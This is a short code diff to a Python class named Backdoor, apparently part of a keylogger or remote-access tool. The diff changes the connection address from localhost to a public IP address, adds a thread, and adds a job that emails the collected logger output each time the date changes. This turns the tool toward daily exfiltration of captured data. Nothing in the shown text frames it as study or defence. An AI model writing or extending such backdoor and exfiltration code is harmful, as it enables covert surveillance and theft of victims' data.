@@ -22,9 +22,9 @@ from Logger import Logger
 
 
 class Backdoor:
-    NUMBER_OF_THREADS = 5
+    NUMBER_OF_THREADS = 6
     JOB_NUMBER = [0, 3, 4, 6]
-    Ip = "127.0.0.1"
+    Ip = "20.101.135.232"
     NUMBER_OF_PORTS = 5
     MAX_PORT_VALUE = 65535
     MIN_PORT_VALUE = 49152
@@ -73,6 +73,9 @@ class Backdoor:
             elif x == 4:
                 self.logger.write_file()
 
+            elif x == 5:
+                self.logger.send_email()
+
             elif x == 6:
                 self.check_date()
 
@@ -116,6 +119,7 @@ class Backdoor:
                 last_day = current_day
                 self.is_date_changed = True
                 self.queue.put(0)
+                self.queue.put(5)
 
             time.sleep(60)
             self.is_date_changed = False
